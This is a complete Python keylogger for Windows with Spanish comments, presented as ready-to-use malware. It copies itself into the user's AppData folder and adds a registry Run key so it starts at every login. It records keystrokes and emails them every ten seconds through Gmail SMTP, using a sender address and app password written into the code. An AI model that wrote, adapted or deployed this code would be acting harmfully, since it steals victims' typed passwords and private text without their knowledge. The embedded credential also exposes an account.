import os, ssl, smtplib, time, shutil, subprocess
from pynput.keyboard import Listener
from email.message import EmailMessage

rscript=os.path.abspath(__file__)
user=os.getlogin()
rt=f'C:\\Users\\{user}\\AppData\\sys0.pyw'
if not os.path.exists(rt):
 shutil.copy(rscript, rt)

reg=f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v sys0 /t REG_SZ /d {rt} /f'
subprocess.run(reg, shell=True)

def enviar_correo(mensaje):
 correo_emisor="pgx008915@gmail.com"
 clave="xuhk kdwn ssqf hcbz"
 correo_receptor=""  # AGREGA EL CORREO DONDE QUIERES RECIBIR LA INFORMACION
 asunto="DATOS_OBTENIDOS"
 body=f"""
{mensaje}
 """
 em=EmailMessage()
 em["From"] = correo_emisor
 em["To"] = correo_receptor
 em["Subject"] = asunto
 em.set_content(body)

 context=ssl.create_default_context()
 with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as smtp:
  smtp.login(correo_emisor, clave)
  smtp.sendmail(correo_emisor, correo_receptor, em.as_string())

enviar = []
send_text = ''
def evento_teclado(key):
 l=str(key).replace('\'', '')
 find1=l.find('Key.')
 find2=l.find('\\x')
 global send_text
 if l == 'Key.space':
  send_text += ' '
 elif find1 != -1 or find2 != -1:
  pass
 else:
  enviar.append(l)
  send_text += l

with Listener(on_press=evento_teclado) as l:
 while True:
  time.sleep(10)
  if send_text == '':
   pass
  else:
   try:
    enviar_correo(send_text)
    send_text = ''
   except:
    pass
